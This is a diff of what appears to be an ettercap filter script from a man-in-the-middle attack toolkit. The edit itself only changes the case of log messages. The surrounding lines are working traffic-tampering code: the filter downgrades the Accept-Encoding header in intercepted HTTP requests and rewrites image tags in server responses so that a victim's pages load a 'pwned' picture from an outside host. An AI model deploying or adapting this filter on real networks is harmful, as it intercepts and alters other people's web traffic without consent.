@@ -25,7 +25,7 @@
 ##########################
 # change target request to server
 if (ip.proto == TCP && tcp.dst == 80) {
-  msg("[morpheus] host:TaRONE   [ -> ]  port:80 HTTP ☆");
+  msg("[morpheus] host:TaRONE   [ -> ]  port:80 http ☆");
     if (search(DATA.data, "Accept-Encoding")) {  
       replace("Accept-Encoding", "Accept-Rubbishe"); # note: replacement string is same length as original string
       msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ☆");
@@ -53,7 +53,7 @@ if (ip.proto == TCP && tcp.dst == 80) {
 #####################
 # change server response to target
 if (ip.proto == TCP && tcp.src == 80) {
-  msg("[morpheus] host:TaRONE   [ <- ]  port:80 HTTP ☆");
+  msg("[morpheus] host:TaRONE   [ <- ]  port:80 http ☆");
   replace("img src=", "img src='http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg'");  
   replace("IMG SRC=", "IMG SRC='http://3.bp.blogspot.com/-LYY46BB5FAE/UXhWPEJcokI/AAAAAAAAAKQ/uVGpXjOZusM/s400/pwned+DH.jpg'");
   msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ☆");
